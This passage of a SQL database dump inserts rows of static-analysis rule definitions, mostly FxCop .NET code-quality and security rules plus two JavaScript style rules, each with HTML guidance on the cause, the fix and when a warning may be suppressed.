<p><a href="http://msdn.microsoft.com/en-us/library/ms182213.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182213.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '30min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812534, 1510817812535, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (588, 'CA1064: Exceptions should be public', 'ExceptionsShouldBePublic', 'CA1064', 'fxcop', '<h2>Cause</h2>
<p>
            A non-public exception derives directly from <code>Exception</code>, <code>SystemException</code>, or <code>ApplicationException</code>.
</p>
<h2>Rule Description</h2>
<p>
            An internal exception is only visible inside its own internal scope. After the exception falls outside the internal scope, only the base exception can be used to catch the exception. If the internal exception is inherited from <code>Exception</code>, <code>SystemException</code>, or <code>ApplicationException</code>, the external code will not have sufficient information to know what to do with the exception.
            But, if the code has a public exception that later is used as the base for a internal exception, it is reasonable to assume the code further out will be able to do something intelligent with the base exception. The public exception will have more information than what is provided by T:System.Exception, T:System.SystemException, or T:System.ApplicationException.
</p>
<h2>How to Fix Violations</h2>
<p>
            Make the exception public, or derive the internal exception from a public exception that is not <code>Exception</code>, <code>SystemException</code>, or <code>ApplicationException</code>.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Suppress a message from this rule if you are sure in all cases that the private exception will be caught within its own internal scope.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/bb264484.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264484.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '1h', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812535, 1510817812536, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (589, 'CA1712: Do not prefix enum values with type name', 'DoNotPrefixEnumValuesWithTypeName', 'CA1712', 'fxcop', '<h2>Cause</h2>
<p>
            An enumeration contains a member whose name starts with the type name of the enumeration.
</p>
<h2>Rule Description</h2>
<p>
            Names of enumeration members are not prefixed with the type name because type information is expected to be provided by development tools.
            Naming conventions provide a common look for libraries that target the common language runtime. This reduces the time that is required for to learn a new software library, and increases customer confidence that the library was developed by someone who has expertise in developing managed code.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, remove the type name prefix from the enumeration member.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:IdentifiersShouldNotHaveIncorrectSuffix}<br/>




                {rule:fxcop:MarkEnumsWithFlags}<br/>




                {rule:fxcop:DoNotMarkEnumsWithFlags}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182237.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182237.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812536, 1510817812537, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (590, 'CA1408: Do not use AutoDual ClassInterfaceType', 'DoNotUseAutoDualClassInterfaceType', 'CA1408', 'fxcop', '<h2>Cause</h2>
<p>
            A Component Object Model (COM) visible type is marked with the <code>ClassInterfaceAttribute</code> attribute set to the <code>AutoDual</code> value of <code>ClassInterfaceType</code>.
</p>
<h2>Rule Description</h2>
<p>
            Types that use a dual interface enable clients to bind to a specific interface layout. Any changes in a future version to the layout of the type or any base types will break COM clients that bind to the interface. By default, if the <code>ClassInterfaceAttribute</code> attribute is not specified, a dispatch-only interface is used.
            Unless marked otherwise, all public nongeneric types are visible to COM; all nonpublic and generic types are invisible to COM.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, change the value of the <code>ClassInterfaceAttribute</code> attribute to the <code>None</code> value of <code>ClassInterfaceType</code> and explicitly define the interface.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule unless it is certain that the layout of the type and its base types will not change in a future version.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:AutoLayoutTypesShouldNotBeComVisible}<br/>




                {rule:fxcop:MarkComSourceInterfacesAsIDispatch}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182205.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182205.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812537, 1510817812538, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (591, 'CA1801: Review unused parameters', 'ReviewUnusedParameters', 'CA1801', 'fxcop', '<h2>Cause</h2>
<p>
            A method signature includes a parameter that is not used in the method body. This rule does not examine the following methods:
            <ul>
              <li>
                Methods referenced by a delegate.
              </li>
              <li>
                Methods used as event handlers.
              </li>
              <li>
                Methods declared with the <code>abstract</code> (<code>MustOverride</code> in Visual Basic) modifier.
              </li>
              <li>
                Methods declared with the <code>virtual</code> (<code>Overridable</code> in Visual Basic) modifier.
              </li>
              <li>
                Methods declared with the <code>override</code> (<code>Overrides</code> in Visual Basic) modifier.
              </li>
              <li>
                Methods declared with the <code>extern</code> (<code>Declare</code> statement in Visual Basic) modifier.
              </li>
            </ul>
</p>
<h2>Rule Description</h2>
<p>
            Review parameters in non-virtual methods that are not used in the method body to make sure no correctness exists around failure to access them. Unused parameters incur maintenance and performance costs.
            Sometimes a violation of this rule can point to an implementation bug in the method. For example, the parameter should have been used in the method body. Suppress warnings of this rule if the parameter has to exist because of backward compatibility.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, remove the unused parameter (a breaking change) or use the parameter in the method body (a non-breaking change).
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule for previously shipped code for which the fix would be a breaking change.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:AvoidUncalledPrivateCode}<br/>




                {rule:fxcop:AvoidUninstantiatedInternalClasses}<br/>




                {rule:fxcop:RemoveUnusedLocals}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182268.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182268.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812538, 1510817812539, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1164, 'Constructor functions should not be called purely for side-effects', 'ConstructorFunctionsForSideEffects', NULL, 'javascript', '<p>Some people like to call a constructor functions without assigning the result to a variable. There is no advantage in this approach since the object the <code>new</code> operator creates isn''t used anywhere. Therefore this misleading syntax should be avoided.</p>
<h2>Noncompliant Code Example</h2>

<pre>
new MyConstructor(); // Non-Compliant
</pre>
<h2>Compliant Solution</h2>

<pre>
var something = new MyConstructor();  // Compliant
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'pitfall', false, 'HTML', 1510817813287, 1510817813288, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1165, '"find" should be used to select the children of an element known by id', 'S2715', NULL, 'javascript', '<p>
  The use of <code>find</code> allows <code>document.getElementById()</code> to be used for the top-level selection, and saves the Sizzle engine for where it''s really needed.
  That makes the query faster, and your application more responsive.
</p>
<p>From the jQuery documentation:</p>

<blockquote>
  Beginning your selector with an ID is always best.<br>
  The <code>.find()</code> approach is faster because the first selection is handled without going through the Sizzle selector engine – ID-only selections are handled using <code>document.getElementById()</code>,
  which is extremely fast because it is native to the browser.
</blockquote>

<h2>Noncompliant Code Example</h2>

<pre>var $productIds = $("#products div.id"); // Noncompliant - a nested query for Sizzle selector engine</pre>

<h2>Compliant Solution</h2>

<pre>var $productIds = $("#products").find("div.id"); // Compliant - #products is already selected by document.getElementById() so only div.id needs to go through Sizzle selector engine</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'jquery,performance,user-experience', false, 'HTML', 1510817813289, 1510817813289, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (592, 'CA1816: Call GC.SuppressFinalize correctly', 'CallGCSuppressFinalizeCorrectly', 'CA1816', 'fxcop', '<h2>Cause</h2>
<p>
            <ul>
              <li>
                A method that is an implementation of <code>IDisposable.Dispose</code> does not call <code>GC.SuppressFinalize</code>.
              </li>
              <li>
                A method that is not an implementation of <code>IDisposable.Dispose</code> calls <code>GC.SuppressFinalize</code>.
              </li>
              <li>
                A method calls <code>GC.SuppressFinalize</code> and passes something other than this (Me in Visual Basic).
              </li>
            </ul>
</p>
<h2>Rule Description</h2>
<p>
            The <code>IDisposable.Dispose</code> method lets users release resources at any time before the object becoming available for garbage collection. If the <code>IDisposable.Dispose</code> method is called, it frees resources of the object. This makes finalization unnecessary. <code>IDisposable.Dispose</code> should call <code>GC.SuppressFinalize</code> so the garbage collector does not call the finalizer of the object.
             
            To prevent derived types with finalizers from having to re-implement [System.IDisposable] and to call it, unsealed types without finalizers should still call <code>GC.SuppressFinalize</code>.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule:
            If the method is an implementation of <code>Dispose</code>, add a call to <code>GC.SuppressFinalize</code>.
            If the method is not an implementation of <code>Dispose</code>, either remove the call to <code>GC.SuppressFinalize</code> or move it to the type''s <code>Dispose</code> implementation.
            Change all calls to <code>GC.SuppressFinalize</code> to pass this (Me in Visual Basic).
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Only suppress a warning from this rule if you are deliberating using <code>GC.SuppressFinalize</code> to control the lifetime of other objects. Do not suppress a warning from this rule if an implementation of <code>Dispose</code> does not call <code>GC.SuppressFinalize</code>. In this situation, failing to suppress finalization degrades performance and provide no benefits.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:DisposeMethodsShouldCallBaseClassDispose}<br/>




                {rule:fxcop:DisposableTypesShouldDeclareFinalizer}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182269.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182269.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812540, 1510817812540, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (593, 'CA1404: Call GetLastError immediately after P/Invoke', 'CallGetLastErrorImmediatelyAfterPInvoke', 'CA1404', 'fxcop', '<h2>Cause</h2>
<p>
            A call is made to the Marshal.GetLastWin32Error method or the equivalent Win32 <code>GetLastError</code> function, and the call that comes immediately before is not to a platform invoke method.
</p>
<h2>Rule Description</h2>
<p>
            A platform invoke method accesses unmanaged code and is defined by using the <code>Declare</code> keyword in Visual Basic or the <code>System.Runtime.InteropServices.DllImportAttribute</code> attribute. Generally, upon failure, unmanaged functions call the Win32 <code>SetLastError</code> function to set an error code that is associated with the failure. The caller of the failed function calls the Win32 <code>GetLastError</code> function to retrieve the error code and determine the cause of the failure. The error code is maintained on a per-thread basis and is overwritten by the next call to <code>SetLastError</code>. After a call to a failed platform invoke method, managed code can retrieve the error code by calling the GetLastWin32Error method. Because the error code can be overwritten by internal calls from other managed class library methods, the <code>GetLastError</code> or GetLastWin32Error method should be called immediately after the platform invoke method call.
            The rule ignores calls to the following managed members when they occur between the call to the platform invoke method and the call to GetLastWin32Error. These members do not change the error code and are useful for determining the success of some platform invoke method calls.
            <ul>
              <li>


                    <code>IntPtr.Zero</code>


              </li>
              <li>


                    IntPtr.Equality


              </li>
              <li>


                    IntPtr.Inequality


              </li>
              <li>


                    <code>SafeHandle.IsInvalid</code>


              </li>
            </ul>
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, move the call to GetLastWin32Error so that it immediately follows the call to the platform invoke method.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if the code between the platform invoke method call and the GetLastWin32Error method call cannot explicitly or implicitly cause the error code to change.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:MovePInvokesToNativeMethodsClass}<br/>




                {rule:fxcop:PInvokeEntryPointsShouldExist}<br/>




                {rule:fxcop:PInvokesShouldNotBeVisible}<br/>




                {rule:fxcop:SpecifyMarshalingForPInvokeStringArguments}<br/>




                {rule:fxcop:UseManagedEquivalentsOfWin32Api}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182199.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182199.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812541, 1510817812542, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (594, 'CA2101: Specify marshaling for P/Invoke string arguments', 'SpecifyMarshalingForPInvokeStringArguments', 'CA2101', 'fxcop', '<h2>Cause</h2>
<p>
            A platform invoke member allows for partially trusted callers, has a string parameter, and does not explicitly marshal the string.
</p>
<h2>Rule Description</h2>
<p>
            When you convert from Unicode to ANSI, it is possible that not all Unicode characters can be represented in a specific ANSI code page. Best-fit mapping tries to solve this problem by substituting a character for the character that cannot be represented. The use of this feature can cause a potential security vulnerability because you cannot control the character that is chosen. For example, malicious code could intentionally create a Unicode string that contains characters that are not found in a particular code page, which are converted to file system special characters such as ''..'' or ''/''. Note also that security checks for special characters frequently occur before the string is converted to ANSI.
            Best-fit mapping is the default for the unmanaged conversion, WChar to MByte. Unless you explicitly disable best-fit mapping, your code might contain an exploitable security vulnerability because of this issue.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, explicitly marshal string data types.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182319.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182319.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812542, 1510817812543, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (595, 'CA2106: Secure asserts', 'SecureAsserts', 'CA2106', 'fxcop', '<h2>Cause</h2>
<p>
            A method asserts a permission and no security checks are performed on the caller.
</p>
<h2>Rule Description</h2>
<p>
            Asserting a security permission without performing any security checks can leave an exploitable security weakness in your code. A security stack walk stops when a security permission is asserted. If you assert a permission without performing any checks on the caller, the caller could indirectly execute code by using your permissions. Asserts without security checks are permissible only when you are sure that the assert cannot be used in a harmful manner. An assert is harmless if the code you call is harmless, or users cannot pass arbitrary information to code that you call.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, add a security demand to the method or its declaring type.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Suppress a warning from this rule only after a careful security review.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182314.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182314.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812543, 1510817812544, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (596, 'CA1502: Avoid excessive complexity', 'AvoidExcessiveComplexity', 'CA1502', 'fxcop', '<h2>Cause</h2>
<p>
            A method has an excessive cyclomatic complexity.
</p>
<h2>Rule Description</h2>
<p>

              Cyclomatic complexity measures the number of linearly independent paths through the method, which is determined by the number and complexity of conditional branches. A low cyclomatic complexity generally indicates a method that is easy to understand, test, and maintain. The cyclomatic complexity is calculated from a control flow graph of the method and is given as follows:
            cyclomatic complexity = the number of edges - the number of nodes + 1
            where a node represents a logic branch point and an edge represents a line between nodes.
            The rule reports a violation when the cyclomatic complexity is more than 25.
            You can learn more about code metrics at Measuring Complexity and Maintainability of Managed Code,
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, refactor the method to reduce its cyclomatic complexity.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if the complexity cannot easily be reduced and the method is easy to understand, test, and maintain. In particular, a method that contains a large <code>switch</code> (<code>Select</code> in Visual Basic) statement is a candidate for exclusion. The risk of destabilizing the code base late in the development cycle or introducing an unexpected change in runtime behavior in previously shipped code might outweigh the maintainability benefits of refactoring the code.
</p>
<h2>How Cyclomatic Complexity is Calculated</h2>
<p>
            The cyclomatic complexity is calculated by adding 1 to the following:
            <ul>
              <li>
                Number of branches (such as <code>if</code>, <code>while</code>, and <code>do</code>)
              </li>
              <li>
                Number of <code>case</code> statements in a <code>switch</code>
              </li>
            </ul>
            The following examples show methods that have varying cyclomatic complexities.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:AvoidExcessiveInheritance}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182212.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182212.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '30min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812545, 1510817812545, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (597, 'CA1409: Com visible types should be creatable', 'ComVisibleTypesShouldBeCreatable', 'CA1409', 'fxcop', '<h2>Cause</h2>
<p>
            A reference type that is specifically marked as visible to Component Object Model (COM) contains a public parameterized constructor but does not contain a public default (parameterless) constructor.
</p>
<h2>Rule Description</h2>
<p>
            A type without a public default constructor cannot be created by COM clients. However, the type can still be accessed by COM clients if another means is available to create the type and pass it to the client (for example, through the return value of a method call).
            The rule ignores types that are derived from <code>System.Delegate</code>.
            By default, the following are visible to COM: assemblies, public types, public instance members in public types, and all members of public value types.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, add a public default constructor or remove the <code>System.Runtime.InteropServices.ComVisibleAttribute</code> from the type.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if other ways are provided to create and pass the object to the COM client.
</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:MarkAssembliesWithComVisible}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182203.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182203.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812546, 1510817812546, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (598, 'CA2140: Transparent code must not reference security critical items', 'TransparentMethodsMustNotReferenceCriticalCode', 'CA2140', 'fxcop', '<h2>Cause</h2>
<p>
            A transparent method:
            <ul>
              <li>
                handles a security critical security exception type
              </li>
              <li>
                has a parameter that is marked as a security critical type
              </li>
              <li>
                has a generic parameter with a security critical constraints
              </li>
              <li>
                has a local variable of a security critical type
              </li>
              <li>
                references a type that is marked as security critical
              </li>
              <li>
                calls a method that is marked as security critical
              </li>
              <li>
                references a field that is marked as security critical
              </li>
              <li>
                returns a type that is marked as security critical
              </li>
            </ul>
</p>
<h2>Rule Description</h2>
<p>
            A code element that is marked with the <code>SecurityCriticalAttribute</code>  attribute is security critical. A transparent method cannot use a security critical element. If a transparent type attempts to use a security critical type a <code>TypeAccessException</code>, <code>MethodAccessException</code> , or <code>FieldAccessException</code> is raised.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, do one of the following:
            <ul>
              <li>
                Mark the code element that uses the security critical code with the <code>SecurityCriticalAttribute</code> attribute
                - or -
              </li>
              <li>
                Remove the <code>SecurityCriticalAttribute</code> attribute from the code elements that are marked as security critical and instead mark them with the <code>SecuritySafeCriticalAttribute</code> or <code>SecurityTransparentAttribute</code> attribute.
              </li>
            </ul>
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/bb264475.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264475.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812547, 1510817812548, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (599, 'CA1008: Enums should have zero value', 'EnumsShouldHaveZeroValue', 'CA1008', 'fxcop', '<h2>Cause</h2>
<p>
            An enumeration without an applied <code>System.FlagsAttribute</code> does not define a member that has a value of zero; or an enumeration that has an applied <code>FlagsAttribute</code> defines a member that has a value of zero but its name is not ''None'', or the enumeration defines multiple zero-valued members.
</p>
<h2>Rule Description</h2>
<p>
            The default value of an uninitialized enumeration, just like other value types, is zero. A non-flags−attributed enumeration should define a member that has the value of zero so that the default value is a valid value of the enumeration. If appropriate, name the member ''None''. Otherwise, assign zero to the most frequently used member. Note that, by default, if the value of the first enumeration member is not set in the declaration, its value is zero.
            If an enumeration that has the <code>FlagsAttribute</code> applied defines a zero-valued member, its name should be ''None'' to indicate that no values have been set in the enumeration. Using a zero-valued member for any other purpose is contrary to the use of the <code>FlagsAttribute</code> in that the AND and OR bitwise operators are useless with the member. This implies that only one member should be assigned the value zero. Note that if multiple members that have the value zero occur in a flags-attributed enumeration, Enum.ToString() returns incorrect results for members that are not zero.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule for non-flags−attributed enumerations, define a member that has the value of zero; this is a non-breaking change. For flags-attributed enumerations that define a zero-valued member, name this member ''None'' and delete any other members that have a value of zero; this is a breaking change.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule except for flags-attributed enumerations that have previously shipped.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:DoNotMarkEnumsWithFlags}<br/>




                {rule:fxcop:DoNotNameEnumValuesReserved}<br/>




                {rule:fxcop:DoNotPrefixEnumValuesWithTypeName}<br/>




                {rule:fxcop:EnumStorageShouldBeInt32}<br/>




                {rule:fxcop:MarkEnumsWithFlags}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182149.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182149.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812548, 1510817812549, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (600, 'CA2147: Transparent methods may not use security asserts', 'SecurityTransparentCodeShouldNotAssert', 'CA2147', 'fxcop', '<h2>Cause</h2>
<p>
            Code that is marked as <code>SecurityTransparentAttribute</code> is not granted sufficient permissions to assert.
</p>
<h2>Rule Description</h2>
<p>
            This rule analyzes all methods and types in an assembly which is either 100% transparent or mixed transparent/critical, and flags any declarative or imperative usage of <code>Assert</code>.
            At run time, any calls to <code>Assert</code> from transparent code will cause a <code>InvalidOperationException</code> to be thrown. This can occur in both 100% transparent assemblies, and also in mixed transparent/critical assemblies where a method or type is declared transparent, but includes a declarative or imperative Assert.
            The .NET Framework 2.0 introduced a feature named transparency. Individual methods, fields, interfaces, classes, and types can be either transparent or critical.
            Transparent code is not allowed to elevate security privileges. Therefore, any permissions granted or demanded of it are automatically passed through the code to the caller or host application domain. Examples of elevations include Asserts, LinkDemands, SuppressUnmanagedCode, and <code>unsafe</code> code.
</p>
<h2>How to Fix Violations</h2>
<p>
            To resolve the issue, either mark the code which calls the Assert with the <code>SecurityCriticalAttribute</code>, or remove the Assert.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a message from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/bb264482.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264482.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812550, 1510817812550, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (601, 'CA1716: Identifiers should not match keywords', 'IdentifiersShouldNotMatchKeywords', 'CA1716', 'fxcop', '<h2>Cause</h2>
<p>
            A name of a namespace, a type, or a viritual or interface member matches a reserved keyword in a programming language.
</p>
<h2>Rule Description</h2>
<p>
            Identifiers for namespaces, types, and virtual and interface members should not match keywords that are defined by languages that target the common language runtime. Depending on the language that is used and the keyword, compiler errors and ambiguities can make the library difficult to use.
            This rule checks against keywords in the following languages:
            <ul>
              <li>
                Visual Basic
              </li>
              <li>
                C#
              </li>
              <li>
                C++/CLI
              </li>
            </ul>
